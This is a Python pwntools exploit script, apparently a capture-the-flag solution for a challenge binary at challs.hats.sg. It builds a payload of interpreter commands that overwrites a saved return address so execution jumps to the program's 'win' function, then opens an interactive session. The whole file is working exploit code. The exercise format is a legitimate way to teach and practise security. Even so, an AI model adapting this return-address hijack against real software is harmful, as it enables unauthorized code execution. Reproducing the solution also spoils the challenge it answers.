from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./chal",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "challs.hats.sg",
    "PORT" : 1308,
}

def exploit(p):
    win = elf.symbols['win']
    saved_rip = elf.symbols['main']+1501
    offset = (saved_rip - win) >> 8

    payload = '0' + 'd'*103 + 'r' + "0au" + 'd'*offset + 'u'
    payload += '0' + 'd'*104 + 'r' + '0' + 'i'*0xa1 + 'u'
  
    sla("Enter the key\n", payload)
    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
